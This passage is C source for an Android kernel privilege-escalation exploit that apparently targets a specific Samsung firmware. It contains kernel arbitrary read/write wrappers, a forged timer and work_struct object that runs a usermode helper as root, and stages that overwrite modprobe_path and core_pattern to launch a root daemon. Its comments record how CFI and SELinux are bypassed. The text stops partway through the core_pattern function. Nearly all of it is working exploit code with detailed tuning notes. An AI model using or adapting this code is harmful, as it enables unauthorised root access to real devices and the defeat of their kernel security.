#include "common.h"

#include <stdlib.h>
#include <sys/mount.h>
#include <sys/un.h>

/* util.c: suppresses configfs_read_once()'s per-read narration so a bulk scan can
 * run tens of thousands of reads without bloating the fsync'd durable log. */
extern int configfs_quiet;
extern unsigned long configfs_read_count;

int root_child_done;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;

#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
#define ROOT_HOLD_READY_SOCKET "cve43499_roothold"

struct umh_subprocess_info {
  uint8_t work[48];
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
  int32_t wait;
  int32_t retval;
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct umh_kernel_data {
  struct umh_completion completion;
  char path[256];
  char arg[16];
  char uid[16];
  uint64_t argv[4];
  uint64_t envp[1];
};

/* Forged terminal object for the timer-cascade forge
 * (install_static_work_umh_root): a timer_list head (56 bytes)
 * immediately followed by a work_struct (48 bytes) whose
 * subprocess_info tail starts at +104.
 *
 * kernel/time/timer.c expire_timers() walks a timer-wheel bucket
 * with `while (!hlist_empty(head))`: it detaches the head timer
 * with __hlist_del() - which writes timer->entry.next into the
 * link that pointed at the timer - and then calls timer->function
 * with the timer_list pointer. The ONLY field of an ARMED
 * delayed_work that can be rewritten while the timer stays armed
 * is therefore timer.entry.next (delayed_work+48, the same offset
 * as subprocess_info.complete): the cascade detaches the forged
 * object the same way and calls its +24 with the object pointer.
 *
 * +24 is timer.function, and it MUST be a genuine
 * void (*)(struct timer_list *): CONFIG_CFI_CLANG=y (non-permissive)
 * panics on a type mismatch at the wheel's indirect call, so
 * call_usermodehelper_exec_work (a work.func type) can NOT live
 * here - that is what would have killed the run18/run19 direct
 * design. Instead +24 is nfc_llcp_sdreq_timer
 * (net/nfc/llcp_core.c, offset in target.h), whose compiled body
 * is from_timer() folded into ADD X2,X0,#0x38 followed by an
 * inlined queue_work onto system_wq: it queues the forged
 * work_struct at stub+56 on a REAL workqueue without touching
 * any other state. A real kworker - sleepable context, init_cred
 * - then runs work.func (+80) = call_usermodehelper_exec_work
 * with the stub+56 pointer, which container_of()s it as a
 * subprocess_info and kernel_threads
 * call_usermodehelper_exec_async(): prepare_kernel_cred(current)
 * on a kworker yields root creds (from the timer softirq,
 * current would be whatever task was interrupted - usually
 * non-root), commit_creds, then kernel_execve() of the helper.
 *
 * Layout safety: the cascade's detach writes stub+0 (LIST_POISON2)
 * and stub+8 (NULL). The work head (+56..+104) and the tail
 * (+104..+168) never intersect those words, and the tail never
 * intersects the timer_list (+0..+56) the wheel consumes - so
 * unlike the delayed_work_timer_fn shape (fake work at timer-48
 * whose tail IS the consumed timer), nothing the wheel writes
 * lands in the subprocess_info. init@144 and cleanup@152 MUST be
 * 0 (the child would otherwise call them), wait@136 = 0 selects
 * the async path, and complete@104 must point at a real empty
 * completion because umh_complete() runs complete() on it after
 * kernel_execve returns. path/argv/envp are KERNEL pointers:
 * kernel_execve consumes them through getname_kernel()
 * (strlen+memcpy) and count_strings_kernel()/copy_strings_kernel()
 * - no user access anywhere, so .data strings are correct. */
struct umh_cascade_stub {
  uint64_t timer_next;      /* +0  : timer.entry.next = 0, ends walk */
  uint64_t timer_prev;      /* +8  : timer.entry.pprev = 0 (wheel fills) */
  uint64_t timer_expires;   /* +16 : timer.expires = 0 */
  uint64_t timer_func;      /* +24 : timer.function = nfc_llcp_sdreq_timer */
  uint64_t timer_flags;     /* +32 : timer.flags, TIMER_IRQSAFE clear */
  uint64_t timer_kabi0;     /* +40 : ANDROID_KABI_RESERVE(1) = 0 */
  uint64_t timer_kabi1;     /* +48 : ANDROID_KABI_RESERVE(2) = 0 */
  uint64_t work_data;       /* +56 : work.data = 0 (PENDING clear) */
  uint64_t work_entry_next; /* +64 : self (stub+64): list_empty, no WARN */
  uint64_t work_entry_prev; /* +72 : self (stub+64) */
  uint64_t work_func;       /* +80 : work.func = exec_work */
  uint64_t work_kabi0;      /* +88 : 0 (never read) */
  uint64_t work_kabi1;      /* +96 : 0 (never read) */
  uint64_t complete;        /* +104: pointer to an empty completion */
  uint64_t path;            /* +112 */
  uint64_t argv;            /* +120 */
  uint64_t envp;            /* +128 */
  uint64_t wait_retval;     /* +136: wait = 0 (async), retval = 0 */
  uint64_t init;            /* +144: MUST be 0 */
  uint64_t cleanup;         /* +152: MUST be 0 */
  uint64_t data;            /* +160 */
};
_Static_assert(sizeof(struct umh_cascade_stub) == 168,
               "cascade stub layout");

/* One cascade payload: the forged terminal object plus the empty
 * completion and the path/argv/envp strings it points at. Each
 * ARMED candidate needs its OWN stub: the cascade writes
 * LIST_POISON2 into stub+0 when it consumes the object, so a
 * second chain through the same object would dereference the poison
 * as a timer_list and fault. */
struct umh_cascade_data {
  struct umh_cascade_stub stub;
  struct umh_completion completion;
  char path[256];
  char arg[16];
  char uid[16];
  uint64_t argv[4];
  uint64_t envp[1];
};

#define UMH_CASCADE_STUBS 3

_Static_assert(sizeof(struct umh_subprocess_info) == 112,
               "subprocess_info layout");
_Static_assert(sizeof(struct umh_completion) == 32, "completion layout");

static int root_read_data(
    int fd, uintptr_t target, void *data, size_t len) {
  /* Same asymmetry as root_write_data: try the physrw reader first, then the configfs AAR.
   * The configfs reader is the one actually proven to reach both kernel .data and the slab
   * arena 0xffffff80011d.... on this firmware, and the workqueue chase depends on the latter,
   * so the fallback is what makes wq -> wq->pools -> worker_pool -> worklist readable. */
  if (pipe_phys_read_data(fd, target, data, len) == (ssize_t)len) {
    return 1;
  }
  return configfs_read_once(fd, target, data, len) == (ssize_t)len;
}

static int root_write_data(
    int fd, uintptr_t target, const void *data, size_t len) {
  /* root_write_data used to call pipe_phys_write_data() unconditionally, which silently
   * returns 0 for every target because install_pipe_physrw() never completes on this
   * firmware - its kmalloc-cache gate gives up after four reclaim passes
   * ("PHYS reclaim gave up after 4 passes; no live kmalloc slab page obtained"). That is why
   * the forged work_struct could never be planted: `data_write=0` / `work_write=0` with no
   * diagnostic anywhere, while every READ in the same function worked.
   *
   * configfs_write_once() is the writer that is actually proven here - it plants
   * modprobe_path in kernel .data every single run ("WR pwrite ret=24 errno=0"). So try the
   * physrw writer first (it is the more general primitive and keeps its behaviour when it does
   * install), then fall back to configfs_write_once(), and report which one actually landed.
   * Read and write asymmetry is expected and measured: the configfs AAR reaches BOTH .data and
   * slab for reads, but writes only .data. */
  if (pipe_phys_write_data(fd, target, data, len) == (ssize_t)len) {
    rmg_diag("RW phys ok target=%016zx len=%zu\n", target, len);
    return 1;
  }
  if (configfs_write_once(fd, target, data, len) == (ssize_t)len) {
    rmg_diag("RW configfs ok target=%016zx len=%zu\n", target, len);
    return 1;
  }
  rmg_diag("RW BOTH writers failed target=%016zx len=%zu "
           "(physrw not installed; target must be in kernel .data "
           "[kaslr+0x2a30000, kaslr+0x2f50000) for configfs)\n", target, len);
  return 0;
}

static int root_read_global(
    int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len) == (ssize_t)len;
}

static int root_write_global(
    int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len) == (ssize_t)len;
}

static int root_read64(
    int fd, uintptr_t target, uint64_t *value) {
  return value && root_read_data(fd, target, value, sizeof(*value));
}

/* umh_read64(): read a kernel-object field with any HANG contained in a child.
 *
 * The umh path has to chase pointers through kernel .data (system_unbound_wq ->
 * pool_workqueue -> pool -> worklist). Those objects live in the linear-map region
 * (ffffff80011d....), and both of our read primitives are unreliable there:
 *
 *   - configfs_read_once() is proven to work on the kernel IMAGE window
 *     (ffffffc00a....): it is what produced 'RD target=ffffffc00aad8800 ... ret=8'
 *     and what carried the CFI ladder to cfi_step=0 on misc_fops=ffffffc00acdcf28.
 *     But on the linear map it is measured to HANG: 'RD target=ffffff80011d2798 ...
 *     len=8' is emitted with no matching 'RD pread ret=' and the run dies.
 *   - pipe_phys_read_data() needs pipebuf_page_base, which is only valid when the
 *     reclaim cache gate passed. Measured this run: gate rejected all 4 passes
 *     ('cache gate FAILED slab=ffffff80011d3980 want=ffffffffffff62f0'), so
 *     root_read64() returned 0 WITHOUT emitting any 'RD target=' line at all -
 *     a silent precondition failure that the caller reported as 'pwq read failed'.
 *
 * So the caller could not tell "this object is unreadable" from "our primitive is
 * down". Fork: the child tries configfs first and pipe_phys second and reports
 * which one worked over a pipe; the parent polls with a deadline. A hung read
 * leaves only the child stuck - the exploit keeps running and we get a line saying
 * exactly which target stalled instead of a frozen run. Timeout is short on purpose
 * because a real configfs hang never returns. */
static int umh_read64(int fd, uintptr_t target, uint64_t *value, const char *what) {
  if (!value) {
    return 0;
  }
  *value = 0;
  int pfd[2];
  if (pipe(pfd) != 0) {
    rmg_diag("ROOT umh read %s pipe() errno=%d\n", what, errno);
    return 0;
  }
  pid_t pid = fork();
  if (pid < 0) {
    close(pfd[0]);
    close(pfd[1]);
    rmg_diag("ROOT umh read %s fork errno=%d\n", what, errno);
    return 0;
  }
  if (pid == 0) {
    close(pfd[0]);
    uint64_t v = 0;
    char tag = 'x';
    /* Try the physical-read primitive FIRST for this stage. The workqueue chase walks
     * wq -> dfl_pwq -> pool -> pool->worklist, and after the first hop those objects live in
     * vmalloc/percpu space (measured: dfl_pwq = 0xffffff805f7f2700), which configfs_read_once()
     * cannot touch - it only covers kernel .data, [kaslr_base+0x2a30000, kaslr_base+0x2f50000).
     * pipe_phys_read64() is the reader that handles arbitrary kernel addresses, and it is what
     * install_pty_umh_root() already uses. Order matters: trying configfs first would PANIC this
     * child on a vmalloc target and we would never learn that pipe_phys could have read it, so
     * each reader gets its own forked child and a panic in one cannot hide a success in another.
     */
    if (pipe_phys_read64(fd, target, &v)) {
      tag = 'H';
    } else {
      v = 0;
      if (configfs_read_once(fd, target, &v, sizeof(v)) == (ssize_t)sizeof(v)) {
        tag = 'C';
      } else {
        v = 0;
        if (root_read_data(fd, target, &v, sizeof(v))) {
          tag = 'C';
        }
      }
    }
    unsigned char pkt[9];
    pkt[0] = (unsigned char)tag;
    memcpy(pkt + 1, &v, 8);
    ssize_t w = write(pfd[1], pkt, sizeof(pkt));
    (void)w;
    _exit(0);
  }
  close(pfd[1]);
  struct pollfd p = {.fd = pfd[0], .events = POLLIN};
  int pr = poll(&p, 1, 4000);
  unsigned char pkt[9];
  ssize_t got = 0;
  if (pr > 0) {
    got = read(pfd[0], pkt, sizeof(pkt));
  }
  close(pfd[0]);
  if (pr <= 0 || got != (ssize_t)sizeof(pkt)) {
    rmg_diag("ROOT umh read %s target=%016zx STALLED (no answer in 4000ms); "
             "child pid=%d left behind\n",
             what, target, (int)pid);
    kill(pid, SIGKILL);
    return 0;
  }
  char tag = (char)pkt[0];
  uint64_t v = 0;
  memcpy(&v, pkt + 1, 8);
  *value = v;
  int st = 0;
  waitpid(pid, &st, 0);
  rmg_diag("ROOT umh read %s target=%016zx via=%s val=%016llx\n", what, target,
           tag == 'C' ? "configfs" : tag == 'H' ? "pipe_phys" : "FAILED",
           (unsigned long long)v);
  if (tag == 'x') {
    return 0;
  }
  return 1;
}

static int root_read32(
    int fd, uintptr_t target, uint32_t *value) {
  return value && root_read_data(fd, target, value, sizeof(*value));
}

static int root_write64(int fd, uintptr_t target, uint64_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write64_exact(int fd, uintptr_t target, uint64_t value) {
  uint64_t readback = 0;
  return root_write64(fd, target, value) &&
         root_read64(fd, target, &readback) && readback == value;
}

static int root_restore64(
    int fd, uintptr_t target, uint64_t ours, uint64_t old) {
  uint64_t current = 0;
  if (!root_read64(fd, target, &current)) {
    return 0;
  }
  if (current == old) {
    return 1;
  }
  return current == ours && root_write64_exact(fd, target, old);
}

static int root_all_zero(const void *data, size_t size) {
  const uint8_t *bytes = data;
  for (size_t i = 0; i < size; i++) {
    if (bytes[i]) {
      return 0;
    }
  }
  return 1;
}

static int wake_system_unbound(void) {
  char slave_name[128];
  int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master_fd < 0 || grantpt(master_fd) != 0 ||
      unlockpt(master_fd) != 0 ||
      ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0) {
    if (master_fd >= 0) {
      close(master_fd);
    }
    return 0;
  }

  int slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (slave_fd < 0) {
    close(master_fd);
    return 0;
  }
  int master_close = close(master_fd);
  int slave_close = close(slave_fd);
  return master_close == 0 && slave_close == 0;
}

/* Read the uid the root helper reported for itself. Returns 1 only when a well-formed
 * "uid=<n> euid=<n> ..." banner was parsed, and requires uid and euid to agree, so a stale
 * file from a previous run or a truncated write cannot be mistaken for proof of root. */
static int read_root_creds_uid(uint32_t *uid_out) {
  int fd = open(ROOT_CREDS_SENTINEL, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  char buf[128];
  ssize_t got = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (got <= 0) {
    return 0;
  }
  buf[got] = '\0';
  unsigned uid = 0, euid = 0;
  if (sscanf(buf, "uid=%u euid=%u", &uid, &euid) != 2) {
    return 0;
  }
  if (uid != euid) {
    rmg_diag("ROOT creds uid/euid disagree uid=%u euid=%u\n", uid, euid);
    return 0;
  }
  *uid_out = uid;
  return 1;
}

static int root_socket_ready(void);

/* 1 iff root is already live on THIS boot: the helper's creds file
 * verifies uid==0 AND was written after boot (mtime >= /proc/stat
 * btime). A previous boot's file verifies identically but proves
 * nothing after a reboot, and a newer file can never predate boot
 * (wall-clock jumps aside, which fail toward retry, never toward a
 * false success). Used to make repeat entries idempotent: a second
 * route/pass must never redo the forge (the mp stage unlinks the
 * creds file and a fresh cascade orphans the live daemon). */
static unsigned long long root_boot_btime(void) {
  static int have = 0;
  static unsigned long long btime = 0;
  if (!have) {
    FILE *f = fopen("/proc/stat", "r");
    if (f) {
      char line[256];
      while (fgets(line, sizeof(line), f)) {
        unsigned long long v = 0;
        if (sscanf(line, "btime %llu", &v) == 1) {
          btime = v;
          break;
        }
      }
      fclose(f);
    }
    have = (btime != 0);
    if (!have) {
      rmg_diag("ROOT boot btime unreadable; treating creds as stale\n");
      return 0;
    }
  }
  return btime;
}

int root_creds_live(void) {
  uint32_t uid = 0xffffffff;
  if (!read_root_creds_uid(&uid) || uid != 0) {
    return 0;
  }
  struct stat st;
  if (stat(ROOT_CREDS_SENTINEL, &st) != 0) {
    return 0;
  }
  unsigned long long bt = root_boot_btime();
  if (bt == 0) {
    return 0;
  }
  return (unsigned long long)st.st_mtime >= bt;
}

/* 1 iff a live root daemon answers on its socket this boot. */
static int root_daemon_live(void) {
  return root_creds_live() && root_socket_ready();
}

/* Idempotence gate for repeat entries (second slide route in one
 * process, supervisor retry on the same boot): when the daemon is
 * already up, skip the whole forge. Non-static for try_cfi_stage. */
int root_already_live(void) {
  if (root_daemon_live()) {
    rmg_diag("ROOT already live this boot (creds + daemon socket); "
             "skipping forge\n");
    return 1;
  }
  return 0;
}

/* True once the root helper's activation sequence has logged completion.
 *
 * The helper writes /data/local/tmp/ksu-activate.log as root and fchowns it to 2000:2000, so
 * the shell-domain payload can read it. This is the success signal that does NOT depend on
 * the daemon's unix socket, which is exactly the link that proved unreliable on device. */
static int root_activation_done(void) {
  static const char kDone[] = "[activate] done";
  int fd = open(ROOT_ACTIVATE_LOG_PATH, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  char buf[4096];
  ssize_t got = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (got <= 0) {
    return 0;
  }
  buf[got] = '\0';
  return strstr(buf, kDone) != NULL;
}

static int root_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }

  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
  int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
  close(fd);
  return ready;
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    (!defined(APP_ROOT_REF_HOLDER_REQUIRED) || APP_ROOT_REF_HOLDER_REQUIRED)
static int root_hold_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  memcpy(address.sun_path + 1, ROOT_HOLD_READY_SOCKET,
         sizeof(ROOT_HOLD_READY_SOCKET) - 1);
  socklen_t address_length = (socklen_t)(
      offsetof(struct sockaddr_un, sun_path) +
      sizeof(ROOT_HOLD_READY_SOCKET));
  int ready = connect(fd, (struct sockaddr *)&address, address_length) == 0;
  close(fd);
  return ready;
}
#endif

/* ---------------------------------------------------------------------------
 * modprobe_path root attempt - a root path that needs NO task walk and NO heap
 * pointer.
 *
 * WHY THIS EXISTS. Both existing root stages are structurally blocked here:
 *   - the PTY/SAK stage is gated on resolve_tty_object(), which needs the
 *     deterministic task walk, and that walk is proven impossible on this
 *     firmware (hardened task_struct reads never return).
 *   - the legacy workqueue stage must dereference heap pointers, and target.h
 *     records that a READ of a direct-map address panics F946BXXS7GZH2. Run 9b
 *     died exactly there: "ROOT umh read wq.dfl_pwq target=ffffff80011db0b0
 *     via=configfs val=ffffff805f7f2400" printed, then the read of the returned
 *     value logged its "RD target=" plan line with no "RD pread ret=" and no
 *     STALLED line, i.e. the process - watchdog parent included - was gone.
 *
 * modprobe_path is a static char[KMOD_PATH_LEN] in .data. Reaching it needs
 * only the image-window ARW that already carries the CFI ladder to cfi_step=0,
 * and firing it needs nothing but an unprivileged syscall.
 *
 * ADDRESS GEOMETRY - the whole reason this uses two different forms:
 *   - data_addr() is CANONICAL on this device. The path that wins here sets
 *     data_addr_canonical = 1 (slide_app.c:548), so data_addr() == text_addr()
 *     and returns a slid kimage address (0xffffffc00a...). Reads of those work
 *     (the CFI ladder and the wq-slot read both do), but fops.c:682 records that
 *     a WRITE to one kills the process - which is why CFI restore is skipped.
 *   - data_direct_addr() returns the linear-map alias, PAGE_OFFSET + phys -
 *     P0_PHYS_OFFSET, i.e. 0xffffff80........, and fops.c:694 records that
 *     writes to those are fine: that is how every other write in this payload
 *     works.
 *
 * So: READ through text_addr(), WRITE through data_direct_addr(), then read the
 * IMAGE back to prove the alias landed. A wrong alias leaves the image
 * unchanged, the original bytes are written back, and nothing is corrupted -
 * the probe is self-correcting rather than a blind store.
 *
 * Offset provenance for MODPROBE_PATH_OFF: derived from the raw F946BXXS7GZH2
 * arm64 Image (file offset == KIMAGE_TEXT_BASE-relative offset), cross-validated
 * in that same file against the ashmem_misc.fops pointer chain, where five
 * independent code entries reproduce target.h exactly. See target.h.
 * ------------------------------------------------------------------------ */

#define ROOT_MP_SCRIPT "/data/local/tmp/mp"
#define ROOT_MP_MARKER "/data/local/tmp/.mp_ran"
/* Carrier for the binfmt-%04x trigger: a file whose first bytes match no binary
 * format and are not printable, which is what makes search_binary_handler() ask
 * for a module. */
#define ROOT_MP_BINFMT "/data/local/tmp/mpbin"
#define ROOT_MP_LEN 24
/* How far above modprobe_path to scan for a misplaced write. Bounded on purpose:
 * each 24-byte step is one AAR read, and the scan only runs when a candidate alias
 * wrote something and the image stayed intact. */
#define ROOT_MP_SCAN_LEN 12288

static int root_mp_read(int fd, uintptr_t addr, void *buf, size_t len,
                        const char *tag) {
  memset(buf, 0, len);
  errno = 0;
  ssize_t got = configfs_read_once(fd, addr, buf, len);
  int ok = got == (ssize_t)len;
  rmg_diag("ROOT mp %s read addr=%016zx ret=%zd errno=%d ok=%d\n", tag, addr,
           got, errno, ok);
  return ok;
}

/* Hex form of a modprobe_path-sized buffer, for the log. Needed because the
 * printable line uses %.24s, which stops at the first NUL: the measured content
 * has a NUL in byte 0, so `ROOT mp orig=[%.24s]` renders as `orig=[]` while all
 * 24 bytes were in fact read back correctly. The hex line is the one to trust.
 * Two slots rotate so a single printf can safely show two buffers. */
static const char *root_mp_hex(const void *buf, size_t len) {
  static const char digits[] = "0123456789abcdef";
  static char out[2][ROOT_MP_LEN * 2 + 1];
  static int slot = 0;
  slot ^= 1;
  char *dst = out[slot];
  const unsigned char *p = (const unsigned char *)buf;
  size_t n = len < ROOT_MP_LEN ? len : ROOT_MP_LEN;
  for (size_t i = 0; i < n; i++) {
    dst[i * 2] = digits[p[i] >> 4];
    dst[i * 2 + 1] = digits[p[i] & 0xf];
  }
  dst[n * 2] = '\0';
  return dst;
}

/* Read ROOT_MP_LEN bytes at `addr`, and only hand back a value that two
 * different windows agree on.
 *
 * Window A is the direct [addr, addr+24). Window B is [addr-1, addr+23), which
 * delivers addr[0] at index 1 instead of index 0. The 22 bytes the windows share
 * (addr[1..22]) must match byte for byte, which pins the alignment of both
 * windows AND proves the primitive agreed with itself; addr[0] is then taken
 * from window B (where it is not index 0) and addr[23] from window A at index 23
 * (also not index 0).
 *
 * Why this exists: the one anomalous measurement on this route was a direct read
 * of modprobe_path that returned 00 73 62 69 6e 2f 6d 6f - "/sbin/mo" with a NUL
 * where the '/' belongs - while bytes 1..7 were exactly right. That is either
 * live memory or a zeroed first byte of the read; this function returns the same
 * 24 bytes under either explanation and lets the caller's content check decide
 * whether they are modprobe_path. It also defeats the documented non-idempotency
 * of the ashmem-name AAR, because the two windows are different name blobs.
 *
 * A failed cross-check is a hard failure (return 0): nothing may be written on
 * the strength of memory two windows could not agree about. */
static int root_mp_read24(int fd, uintptr_t addr, char *out, const char *tag) {
  char direct[ROOT_MP_LEN];
  char shifted[ROOT_MP_LEN];
  for (int try = 0; try < 3; try++) {
    char tag_a[24];
    char tag_b[24];
    snprintf(tag_a, sizeof(tag_a), "%sA", tag);
    snprintf(tag_b, sizeof(tag_b), "%sB", tag);
    int direct_ok = root_mp_read(fd, addr, direct, sizeof(direct), tag_a);
    int shifted_ok =
        root_mp_read(fd, addr - 1, shifted, sizeof(shifted), tag_b);
    if (!direct_ok || !shifted_ok) {
      continue;
    }
    if (memcmp(direct + 1, shifted + 2, ROOT_MP_LEN - 2) != 0) {
      rmg_diag("ROOT mp %s windows DISAGREE on addr[1..22] try=%d direct=%s "
               "shifted=%s\n",
               tag, try + 1, root_mp_hex(direct, ROOT_MP_LEN),
               root_mp_hex(shifted, ROOT_MP_LEN));
      continue;
    }
    if (direct[0] != shifted[1]) {
      rmg_diag("ROOT mp %s index0 suspect direct=%02x shifted=%02x; taking the "
               "shifted byte\n",
               tag, (unsigned char)direct[0], (unsigned char)shifted[1]);
    }
    memcpy(out, shifted + 1, ROOT_MP_LEN - 1);        /* addr[0..22] */
    out[ROOT_MP_LEN - 1] = direct[ROOT_MP_LEN - 1];   /* addr[23] */
    return 1;
  }
  return 0;
}

/* Read one byte at `addr`. The index-0 concern applies here too, and it is not
 * just a veto: this value decides whether SELinux gets flipped to permissive
 * before the usermode helper runs, and the value is what gets written back at
 * the end of the attempt. So the byte is taken from a two-byte window where it
 * sits at index 1; the direct single-byte read is taken as well and logged for
 * comparison, but a failed window read is a hard failure - better to leave
 * SELinux untouched than to restore the wrong value into it. */
static int root_mp_read_byte(int fd, uintptr_t addr, unsigned char *out,
                             const char *tag) {
  char win[2];
  char direct[1];
  char tag_w[24];
  char tag_d[24];
  snprintf(tag_w, sizeof(tag_w), "%sB", tag);
  snprintf(tag_d, sizeof(tag_d), "%sA", tag);
  if (!root_mp_read(fd, addr - 1, win, sizeof(win), tag_w)) {
    rmg_diag("ROOT mp %s byte window read failed; value unavailable\n", tag);
    return 0;
  }
  if (root_mp_read(fd, addr, direct, sizeof(direct), tag_d) &&
      direct[0] != win[1]) {
    rmg_diag("ROOT mp %s byte index0 suspect direct=%02x shifted=%02x; taking "
             "the shifted byte\n",
             tag, (unsigned char)direct[0], (unsigned char)win[1]);
  }
  *out = (unsigned char)win[1];
  return 1;
}

static int root_mp_write(int fd, uintptr_t addr, const void *buf, size_t len,
                         const char *tag) {
  errno = 0;
  ssize_t wrote = configfs_write_once(fd, addr, buf, len);
  int ok = wrote == (ssize_t)len;
  rmg_diag("ROOT mp %s write addr=%016zx ret=%zd errno=%d ok=%d\n", tag, addr,
           wrote, errno, ok);
  return ok;
}

/* Build the usermode helper the kernel will exec. It records that it ran BEFORE
 * calling the helper in --umh mode, so a marker with no creds still separates
 * "the script executed" from "the helper failed", and --umh is what writes the
 * real uid=0/euid=0 banner and runs the activation sequence.
 *
 * The helper is deliberately BACKGROUNDED: umh_main() ends in daemon_main(), so
 * a foreground call would never return and request_module()'s UMH_WAIT_PROC
 * would block the trigger thread forever. Backgrounding it makes the shell exit
 * immediately (the kernel's wait completes), while the helper keeps running as
 * a kernel-spawned root daemon - which is exactly the end state we want. */
static int root_mp_env_seconds(const char *name, int fallback);

/* Scratch for the optional shell-script form of the core_pattern target. A function rather than
 * a local so the pattern-building below can share one buffer without a nested declaration. */
static char core_pattern_script[512];
static char *script_buf(void) { return core_pattern_script; }

/* ==== core_pattern (pipe mode) root stage ====
 *
 * The only remaining route that needs nothing but a kernel .data write. modprobe_path cannot work here: call_modprobe() runs security_kernel_module_request() before
 * queueing the usermodehelper and that AVC denies u:r:shell:s0 (measured; modprobe_path also has
 * exactly one caller in the tree, so there is no second entry point). Every queue- or cred-based
 * route needs a heap write, which this firmware cannot perform (writing any kmalloc-slab address
 * through the configfs AAR kills the device - verified repeatedly with the write issued from the
 * parent so there is no child-died-before-logging ambiguity).
 *
 * core_pattern's pipe mode reaches a usermodehelper by a DIFFERENT path:
 *     get_signal() -> sig_kernel_coredump() -> do_coredump() -> __crash_kexec()
 *                  -> call_usermodehelper_setup() -> queue_work(system_unbound_wq, ...)
 * There is no security_kernel_module_request() anywhere on that path. The queued work is executed
 * by a kworker, and kworkers run with init_cred - the same privilege source the upstream UMH route
 * depends on. core_pattern is a .data global (CORE_PATTERN_OFF, located by a validated byte-pattern
 * search of this firmware's Image), so planting it needs only the write primitive we already have.
 *
 * format_corename() does "++pat_ptr", which skips the leading '|', so cn.corename begins with '/'
 * and the pipe branch IS taken. An earlier claim that this branch was rejected was wrong.
 *
 * Trigger: an unprivileged process that crashes with a dumpable core limit. RLIMIT_CORE is raised
 * and SIGSEGV raised in a forked child, so the calling thread never sees the signal.
 *
 * Opt-in via ROOT_CPIPE=1 because it writes a kernel global that persists until reboot; the mp
 * stage restores its own write and this one deliberately does not need to (a reboot is the
 * cleanup). */
int core_pattern_root_attempt(int fd) {
  const char *helper = getenv("CVE43499_ROOT_HELPER");
  if (!helper || helper[0] != '/') {
    helper = ROOT_UMH_PATH;
  }
  const char *marker = "/data/local/tmp/.cp_ran";
  unlink(marker);

  /* What to point core_pattern at.
   *
   * Measured: planting the pipe and verifying the read-back works, but the helper never ran.
   * The likeliest reason is that core_pattern's pipe mode execs the target DIRECTLY as a
   * program, and a "#!/system/bin/sh" script requires the kernel to resolve and exec the
   * interpreter as well - one more exec under the kernel_sid domain, and one more thing SELinux
   * can refuse. So default to the ELF HELPER itself, which already implements the UMH path
   * (main() dispatches argv[1]=="--umh" to umh_main), and only fall back to the shell script if
   * the caller asks for it. That removes an exec from the chain rather than debugging it.
   *
   * The pipe command is argv[0] with the rest as arguments, so the pattern is
   * "|<helper> --umh <uid>". Keep it under COREP_NAME_SIZE (128). */
  char pattern[128];
  memset(pattern, 0, sizeof(pattern));
  int pn;
  if (getenv("ROOT_CPIPE_SH")) {
    int sn = snprintf(script_buf(), sizeof(core_pattern_script),
                      "#!/system/bin/sh\n"
                      "id > %s.ids 2>&1\n"
                      "echo start > %s 2>/dev/null\n"
                      "chmod 0666 %s 2>/dev/null\n"
                      "%s --umh %u &\n",
                      marker, marker, marker, helper, (unsigned)getuid());
    if (sn <= 0 || sn >= (int)sizeof(core_pattern_script)) {
      rmg_diag("ROOT cp script build failed n=%d\n", sn);
      return 0;
    }
    int sfd = open("/data/local/tmp/cp", O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
    if (sfd < 0) {
      rmg_diag("ROOT cp script open errno=%d\n", errno);
      return 0;
    }
    ssize_t wrote = write(sfd, script_buf(), (size_t)sn);
    if (fchmod(sfd, 0755) != 0) {
      rmg_diag("ROOT cp script fchmod errno=%d\n", errno);
    }
    close(sfd);
    rmg_diag("ROOT cp script written bytes=%zd helper=%s\n", wrote, helper);
    pn = snprintf(pattern, sizeof(pattern), "|/data/local/tmp/cp");
  } else {
    pn = snprintf(pattern, sizeof(pattern), "|%s --umh %u", helper, (unsigned)getuid());
  }
  if (pn <= 0 || pn >= (int)sizeof(pattern)) {
    rmg_diag("ROOT cp pattern build failed n=%d\n", pn);
    return 0;
  }
  const uintptr_t cp_addr = text_addr(CORE_PATTERN);
  rmg_diag("ROOT cp core_pattern addr=%016zx len=%d pattern=[%s]\n", cp_addr, pn, pattern);
  if (!root_write_global(fd, cp_addr, pattern, (size_t)pn)) {
    rmg_diag("ROOT cp pattern WRITE FAILED addr=%016zx\n", cp_addr);
    return 0;
  }
  char verify[128];
  memset(verify, 0, sizeof(verify));
  if (!root_read_global(fd, cp_addr, verify, (size_t)pn)) {
    rmg_diag("ROOT cp pattern readback FAILED\n");
    return 0;
  }
  rmg_diag("ROOT cp pattern readback=[%.*s] match=%d\n", pn, verify,
           memcmp(verify, pattern, (size_t)pn) == 0);
  if (memcmp(verify, pattern, (size_t)pn) != 0) {
    rmg_diag("ROOT cp pattern MISMATCH - not continuing\n");
    return 0;
  }

